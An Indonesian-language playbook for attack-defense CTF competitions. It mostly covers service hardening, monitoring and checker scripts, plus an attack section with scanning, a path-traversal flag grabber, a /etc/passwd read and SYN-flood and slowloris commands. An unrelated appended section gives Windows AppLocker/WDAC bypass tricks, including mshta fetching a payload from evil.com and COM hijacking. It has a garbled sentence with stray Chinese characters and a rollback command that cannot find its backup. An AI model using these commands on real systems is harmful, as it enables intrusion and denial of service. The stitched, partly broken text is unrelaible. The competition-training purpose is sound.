---
title: "Attack-Defense Service Hardening & Competition Playbook"
tags:
  - attack-defense
  - hardening
  - ctf
  - service-patching
  - monitoring
aliases:
  - "attack-defense-hardening-playbook"
created: '2026-07-28'
updated: '2026-07-28'
status: pending
cssclasses:
  - wide-table
  

---

# ⚔️ Attack-Defense Service Hardening & Competition Playbook

> **Panduan praktis untuk bertahan (defense) dan menyerang (attack) dalam kompetisi Attack-Defense CTF.** Semua service perlu di-*hardening* dalam 5 menit pertama, checker harus lulus, dan Anda harus bisa menyerang service lawan tanpa menjatuhkan service sendiri. **Fokus pada teknik universal — tidak terikat service tertentu.** Untuk gambaran besar, lihat [[hierarchy-cyber-range-adversary-emulation]].

> [!tip] Golden Rule Attack-Defense
> **"Hardening satu menit pertama = 100% defense score. Attack selama 59 menit berikutnya = attack score tambahan. Jika hardening gagal = 0 defense score + lawan dapat attack dari service Anda."** Harden service Anda SEBELUM mencoba exploit lawan.

---

## Daftar Isi

- [[#Fase 0 — Service Discovery & Profiling (5 Menit Pertama)]]
- [[#Fase 1 — Hardening Cepat (5-10 Menit)]]
- [[#Fase 2 — Hardening Lanjutan (10-30 Menit)]]
- [[#Fase 3 — Monitoring & Checker Setup]]
- [[#Fase 4 — Attack Strategy]]
- [[#Service-Specific Hardening]]
- [[#Patch Management — Backup & Rollback]]
- [[#Checker Script Patterns]]
- [[#Communication & Teamwork Protocol]]
- [[#Cheat Sheet — Quick Commands]]

---

## Fase 0 — Service Discovery & Profiling (5 Menit Pertama)

### Identifikasi Service Yang Jalan

Kompetisi A/D biasanya memberi Anda VM/server dengan beberapa service yang sudah jalan. **Identifikasi dulu service apa saja yang harus dilindungi.**

```bash
# 1. Port scanning — service apa yang terbuka?
ss -tlnp        # TCP listening ports
ss -ulnp        # UDP listening ports
netstat -tlnp   # Alternatif

# 2. Proses — service mana yang terkait dengan port?
ps aux | grep -E "apache|nginx|httpd|python|node|java|flask|django|custom"

# 3. Service yang di-manage systemd?
systemctl list-units --type=service --state=running

# 4. Cek service binary — di mana lokasinya?
ls -la /opt/ /var/www/ /home/*/service/ /srv/
```

### Profiling Cepat

Setelah dapet daftar service, profile dengan cepat:

```bash
# Port 80/8080 → Web service (Apache/Nginx/Flask/Django/Node)
curl -v http://localhost:80
# Catat: HTTP header, Server version, framework

# Port lain → Custom service binary
file /opt/service/runner   # ELF, Python, Java JAR, Node.js
strings /opt/service/runner | head -50
```

**Untuk setiap service, catat:**

| Info | Contoh |
|------|--------|
| Port | 8080 |
| Protocol | HTTP / TCP raw / UDP |
| Framework/Stack | Flask Python 3.11 / Node.js 20 / custom binary |
| Auth required? | Ya/Tidak |
| Input endpoint | /api/upload, POST /submit, GET /flag |
| Checker script | /opt/checker.py atau terpisah |

---

## Fase 1 — Hardening Cepat (5-10 Menit)

Ini adalah **hardening minimum** yang harus diselesaikan dalam 5–10 menit pertama agar service bisa jalan aman.

### 1.1 Firewall — Tutup Semua Kecuali Port Service

```bash
# Setup UFW (paling cepat)
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh                      # Akses remote
ufw allow 8080/tcp                 # Port service kompetisi
ufw allow from 10.0.0.0/8         # Network antar tim (jika ada)
ufw enable

# Atau iptables (lebih presisi)
iptables -P INPUT DROP
iptables -A INPUT -i lo -j ACCEPT  # Loopback
iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # SSH
iptables -A INPUT -p tcp --dport 8080 -j ACCEPT  # Service
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -j ACCEPT
```

### 1.2 Non-Root User

```bash
# Buat user khusus untuk service
useradd -m -s /bin/bash svc_user
chown -R svc_user:svc_user /opt/service/

# Jalankan service sebagai non-root
# Jika systemd unit — edit User=svc_user
```

### 1.3 Hapus Debug Mode & Verbose Error

```bash
# Web service (Flask)
export FLASK_ENV=production
export FLASK_DEBUG=0

# Django
sed -i 's/DEBUG = True/DEBUG = False/' /opt/service/settings.py

# Node.js/Express
export NODE_ENV=production
# Hapus stack trace dari response error
```

### 1.4 Input Validation — Proteksi Dasar

```bash
# Tambahkan input validation wrapper:
# - Maksimal panjang input (jangan > 4096 bytes)
# - Hanya printable ASCII
# - Rate limit per IP
# - Nonaktifkan path traversal (../../etc/passwd)

# Untuk service Python — tambahkan decorator:
# @app.before_request untuk Flask
# Dari dalam service binary — lebih sulit, perlu patch binary
```

### 1.5 Ganti Default Credentials

```bash
# Cari file config
find /opt /etc /var -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null

# Ganti password default
# Jangan lupa update checker script dengan password baru!
```

### 1.6 Rate Limiting

```bash
# Nginx rate limit
limit_req_zone $binary_remote_addr zone=ctf:10m rate=10r/s;
limit_req zone=ctf burst=20 nodelay;

# Python (Flask)
from flask_limiter import Limiter
limiter = Limiter(app, key_func=lambda: request.remote_addr, default_limits=["10 per second"])

# Iptables rate limit
iptables -A INPUT -p tcp --dport 8080 -m limit --limit 20/s -j ACCEPT
```

---

## Fase 2 — Hardening Lanjutan (10-30 Menit)

### 2.1 Disable Unused Features

```bash
# Apache
a2dismod autoindex       # Disable directory listing
a2dismod status          # Disable server status
a2dismod info            # Disable server info
a2enmod security         # Enable security headers

# Nginx
# autoindex off;
# server_tokens off;
# add_header X-Frame-Options DENY;
# add_header X-Content-Type-Options nosniff;
```

### 2.2 Remove Unused Tools

```bash
# Attacker tool yang mungkin dipakai lawan?
apt remove --purge -y netcat nmap tcpdump python3-pip gcc make gdb
# JANGAN hapus tool yang diperlukan checker script!
```

### 2.3 SSH Hardening

```bash
# /etc/ssh/sshd_config:
PasswordAuthentication no         # Key only
PermitRootLogin no                # No root
MaxAuthTries 3                    # Lockout after 3
ClientAliveInterval 300
ClientAliveCountMax 0

systemctl restart sshd
```

### 2.4 Filesystem Protection

```bash
# Mount /tmp as noexec (jangan biarkan attacker jalanin binary dari /tmp)
mount -o remount,noexec,nosuid /tmp

# Read-only configuration — setelah hardening, lock file
chmod 444 /opt/service/config.py  # Read only
chattr +i /opt/service/config.py  # Immutable (butuh root, hati-hati)
```

### 2.5 Limit Resource Usage

```bash
# Systemd service limits
# /etc/systemd/system/service-8080.service
[Service]
MemoryMax=256M
CPUQuota=50%
TasksMax=20
Restart=on-failure
RestartSec=5

systemctl daemon-reload
systemctl restart service-8080
```

---

## Fase 3 — Monitoring & Checker Setup

### 3.1 Checker Script — Tulang Punggung Defense Score

Checker script adalah **program yang menguji service Anda berfungsi normal.** Jika checker FAIL, defense score Anda = 0 untuk service itu pada ronde itu.

```python
#!/usr/bin/env python3
"""Checker script template — test service health"""
import requests
import sys
import time

TARGET = sys.argv[1]  # IP service yang di-test
PORT = 8080
TIMEOUT = 5

def check_health():
    """Test endpoint health"""
    try:
        r = requests.get(f"http://{TARGET}:{PORT}/health", timeout=TIMEOUT)
        return r.status_code == 200
    except:
        return False

def check_business_logic():
    """Test fungsi utama service"""
    try:
        # Test create
        r = requests.post(f"http://{TARGET}:{PORT}/api/data",
                         json={"value": "test123"}, timeout=TIMEOUT)
        if r.status_code != 201:
            return False, "Create failed"
        
        # Test read
        data_id = r.json().get("id")
        r = requests.get(f"http://{TARGET}:{PORT}/api/data/{data_id}", timeout=TIMEOUT)
        if r.status_code != 200:
            return False, "Read failed"
        
        return True, "OK"
    except Exception as e:
        return False, str(e)

if __name__ == "__main__":
    health = check_health()
    biz, msg = check_business_logic()
    
    if health and biz:
        print("OK")
        sys.exit(0)
    else:
        print(f"FAIL: {msg}")
        sys.exit(1)
```

**Checker harus dijalankan dari server terpisah** (bukan dari service server yang sama) — karena kalau service mati, checker dari localhost bisa saja tetap jalan.

### 3.2 Monitoring — Realtime Alert

```bash
# Monitor log realtime
journalctl -u service-8080 -f &
tail -f /var/log/service/access.log &

# Monitor port
while true; do
    if ! ss -tlnp | grep -q 8080; then
        echo "[!] Service 8080 DOWN! Restarting..."
        systemctl restart service-8080
    fi
    sleep 5
done &

# HTTP health check
while true; do
    if ! curl -sf http://localhost:8080/health > /dev/null; then
        echo "[!] Health check FAILED at $(date)"
        # Log ke file, trigger restart
    fi
    sleep 10
done &
```

### 3.3 Log Centralization

```bash
# Simpan log ke folder yang terstruktur
mkdir -p /var/log/attack-defense/{access,error,checker}

# Cron job log rotation (jika perlu)
cat > /etc/logrotate.d/attack-defense <<EOF
/var/log/attack-defense/*.log {
    daily
    rotate 3
    compress
    missingok
    notifempty
}
EOF
```

---

## Fase 4 — Attack Strategy

### 4.1 Reconnaissance — Cari Service Lawan

```bash
# Scan range IP tim lawan
# Biasanya format: 10.0.{team_id}.3/24 atau 172.16.{team_id}.0/24

# Service discovery
nmap -p- 10.0.1.3          # Full port scan (lambat — tapi thorough)
nmap -p 80,8080,8000 10.0.1.3  # Service port only (cepat)

# Service version detection
nmap -sV -p 8080 10.0.1.3

# Cari service yang exposed (tidak di-hardening)
nmap -sC -p 8080 10.0.1.3  # Default scripts
```

### 4.2 Vulnerability Identification

```bash
# Web service — cari endpoint
gobuster dir -u http://10.0.1.3:8080 -w /usr/share/wordlists/dirb/common.txt

# Web service — parameter fuzzing
ffuf -u http://10.0.1.3:8080/api/FUZZ -w api_endpoints.txt

# Custom binary — reverse engineering
# Download binary service lawan (jika accessible)
wget http://10.0.1.3:8080/service_binary
file service_binary
strings service_binary | head -100
```

### 4.3 Flag Injection Strategy

Flag biasanya di-inject oleh checker ke dalam service. **Anda harus mencuri flag dari service lawan** dan submit.

```bash
# Cara umum flag disimpan:
# - Di database SQLite: /opt/service/flag.db
# - Di file: /opt/service/flag.txt
# - Di memory: environment variable
# - Di response: /flag, /api/flag endpoint

# Jika service lawan tidak di-hardening:
# - Try default password
# - Try path traversal
# - Try SQL injection

# Exploit writer pattern:
# 1. Baca file flag dari service lawan
# 2. Ekstrak flag (regex: [A-Za-z0-9]{32,})
# 3. Submit ke server scoreboard
```

**Template Exploit Sederhana:**

```python
#!/usr/bin/env python3
"""Exploit template — Attack service lawan"""
import requests
import sys
import re

TARGET = sys.argv[1]
PORT = 8080

def get_flag():
    """Coba berbagai cara extract flag"""
    methods = [
        f"http://{TARGET}:{PORT}/flag",
        f"http://{TARGET}:{PORT}/api/flag",
        f"http://{TARGET}:{PORT}/../../flag",
        f"http://{TARGET}:{PORT}/../flag.txt",
    ]
    for url in methods:
        try:
            r = requests.get(url, timeout=3)
            if 'CTF' in r.text or 'flag' in r.text:
                return r.text
        except:
            continue
    return None

if __name__ == "__main__":
    flag = get_flag()
    if flag:
        print(f"Flag: {flag}")
    else:
        print("No flag found")
        sys.exit(1)
```

### 4.4 Denial of Service (Gunakan dengan Hati-hati)

Di beberapa kompetisi, DoS diperbolehkan untuk menjatuhkan service lawan.

```bash
# Slowloris — slow HTTP attack
slowloris -s 500 -p 8080 10.0.1.3

# SYN flood (hanya di ronde attack, bukan permanent)
hping3 -S --flood -p 8080 10.0.1.3

# Resource exhaustion
ab -n 10000 -c 200 http://10.0.1.3:8080/
```

**📝 Catatan etika:** Hanya DoS jika diizinkan rulebook. Beberapa kompetisi melarang DoS karena merusak pengalaman tim lain.

---

## Service-Specific Hardening

### Web Service (Flask/Django/Express)

| Langkah | Command |
|---------|---------|
| Nonaktifkan debug | `FLASK_ENV=production` / `DEBUG=False` |
| CORS restrict | `CORS(app, origins=['http://checker.local'])` |
| Input validation | Validate tipe, panjang, range |
| Jinja2 autoescape | `app.jinja_env.autoescape = True` (cegah XSS) |
| Rate limit | Flask-Limiter / Express-rate-limit |
| Front-end proxy | Nginx reverse proxy + static files |
| Session cookies | Secure, HttpOnly, SameSite=Strict |

### Custom Binary Service

| Langkah | Command |
|---------|---------|
| Cek checksec | `checksec --file=binary` → NX, PIE, RELRO, Canary |
| Non-root run | `runuser -u svc_user /opt/service/binary` |
| Canary enable (recompile) | `-fstack-protector-strong` |
| ASLR | `sysctl -w kernel.randomize_va_space=2` |
| Seccomp | `seccomp-tools` — batasi syscall |
| Resource limit | `ulimit -n 100 -u 20 -f 1000000` |
| Sandbox | `bubblewrap`, `firejail`, atau `nsjail` — isolasi service |

### Database Service (SQLite / PostgreSQL)

```bash
# SQLite
# Jangan pakai path default — pindahkan
# Permission: 600

# PostgreSQL
# Listen di localhost only
# Revoke public schema access
# Ganti password default

# SQL injection mitigasi:
# Parameterized query wajib
# Tanpa parameterized query = vuln pasti
```

---

## Patch Management — Backup & Rollback

### Sebelum Patch

```bash
# 1. Backup service binary & config
cp /opt/service /opt/service.bak.$(date +%s)
cp /opt/service/config /opt/service/config.bak.$(date +%s)

# 2. Simpan checksum
sha256sum /opt/service > /var/log/service_checksum.txt

# 3. Catat perubahan
echo "$(date) - Patch: di nonaktifkan debug mode" >> /var/log/patch_log.txt
```

### Rollback Plan

```bash
# Jika patch break service:
systemctl stop service-8080
cp /opt/service.bak.$(date +%s) /opt/service
systemctl restart service-8080
```

**Rollback harus selesai dalam < 15 detik** — agar checker tidak sempat timeout.

---

## Communication & Teamwork Protocol

### Peran Tim (3-5 orang)

| Role | Tugas | Tools |
|------|-------|-------|
| **Defense Lead** | Harden semua service, monitor checker, restart | SSH, systemd, monitoring script |
| **Attack Lead** | Exploit service lawan, cari flag | nmap, exploit script, flag submitter |
| **Checker/Log Monitor** | Pastikan checker lulus tiap ronde, log analysis | Checker script, tail, grep |
| **Resource/Utility** | Backup, restore, tool install, proxy | SCP, git, apt, tmux |

### Komunikasi per Ronde

**Format status message:**
```
[Ronde 3] Service: ✅ Web | ❌ DB (restarting) | ✅ Auth
[Attack] 10.0.5.3:8080 vuln via path traversal → flag injected
[Flag] Submitted 3 flag ronde ini
[Resource] /tmp habis — cleanup
```

### TMUX Setup untuk Attack-Defense

```bash
# Layout terminal
tmux new-session -d -s ad_ctf
tmux split-window -h
tmux select-pane -t 0
tmux split-window -v
tmux select-pane -t 2
tmux split-window -v

# Pane 0: Monitoring + checker
# Pane 1: Service log
# Pane 2: Attack
# Pane 3: Flag submit
```

---

## Cheat Sheet — Quick Commands

### Hardening 30 Detik

```bash
# Firewall deny all except port 8080
ufw default deny incoming && ufw allow ssh && ufw allow 8080 && ufw --force enable

# Non-root setup
useradd -m svc && chown -R svc:svc /opt/service/

# Nonaktifkan debug
export FLASK_ENV=production
export NODE_ENV=production

# Rate limit iptables
iptables -A INPUT -p tcp --dport 8080 -m limit --limit 10/s -j ACCEPT

# Resource limit
ulimit -n 100 -u 20 2>/dev/null

# Service auto-restart
systemctl edit service-8080 --drop-in=restart.conf <<EOF
[Service]
Restart=always
RestartSec=3
EOF
```

### Attack 30 Detik

```bash
# Scan port satu target
nmap -p 80,8080,8000 10.0.1.3 -sV

# Cari endpoint
ffuf -u http://10.0.1.3:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Coba default path flag
curl -s http://10.0.1.3:8080/flag

# Coba path traversal
curl -s http://10.0.1.3:8080/../../../etc/passwd
```

### Monitoring 30 Detik

```bash
# Service health loop
while true; do curl -sf http://localhost:8080/health && echo "OK $(date)" || echo "FAIL $(date)"; sleep 5; done

# Port check loop
while true; do ss -tlnp | grep 8080 && echo "PORT OK $(date)" || echo "PORT DOWN $(date)"; sleep 10; done

# Checker (dari remote)
while true; do python3 /opt/checker.py localhost && echo "CHECKER OK $(date)" || echo "CHECKER FAIL $(date)"; sleep 30; done
```

---

## Cross-Link

- **Atlas Attack-Defense** → [[hierarchy-cyber-range-adversary-emulation]]
- **CTF Methodology (Attack-Defense section)** → [[ctf-competition-methodology-strategy]]
- **Tool Arsenal** → [[ctf-tool-arsenal-universal]]
- **Network Forensics (monitor traffic lawan)** → [[hierarchy-network-forensics]]
- **Endpoint Security (hardening OS)** → [[hierarchy-endpoint-security]]
- **Master Index** → [[master-index]]

---

*Attack-Defense Hardening · 5 Menit Pertama = Penentu · Hardening > Attack · Checker = Tulang Punggung Defense Score · Backup Sebelum Patch · Rollback <15 Detik*

## Konkret — Hardening Bypass (Testable)

### AppLocker / WDAC Bypass

```powershell
# 1. LOLBins (Living Off the Land Binaries)
#    Binary Microsoft-signed → not blocked by default
#    Examples: mshta.exe, wscript.exe, cscript.exe, msbuild.exe

# mshta (execute HTA → script)
mshta.exe http://evil.com/payload.hta
# Payload.hta:
# <script>new ActiveXObject("WScript.Shell").Run("powershell -c ...")</script>

# 2. InstallUtil.exe (bypass path allow)
InstallUtil.exe /logfile= /LogToConsole=false /U evil.dll
# evil.dll: System.Configuration.Install.Installer subclass → uninstall → code exec

# 3. MSBuild inline task
msbuild.exe p.xml
# p.xml: <Task>...<![CDATA[ code ]]></Task>
```

### ASR (Attack Surface Reduction) Bypass

```powershell
# ASR rule block: Office child process, WMI event sub, credential steal
# 1. Test: which rule triggered via Event ID 1121 (Audit)
# 2. Bypass: use alternative binary yang tidak di-cover
#    - Office macro → use出版的Excel instead of Word (different rule?)
#    - WScript → use mshta (not in rule)
#    - PowerShell → use C# inline compile (Add-Type)
```

### WDAC (Windows Defender Application Control) Bypass

```powershell
# 1. WDAC = code integrity policy (block unsigned)
# 2. Bypass: LOLBin (signed by Microsoft)
# 3. Bypass: reflective load (memory only) → no file → no check
# 4. Bypass: COM hijack → load arbitrary DLL via legit process
#    COM object: HKCU\Software\Classes\CLSID\{...}\InProcServer32
#    → C:\evil.dll (loaded by explorer.exe → signed process)
```
---

audited
---
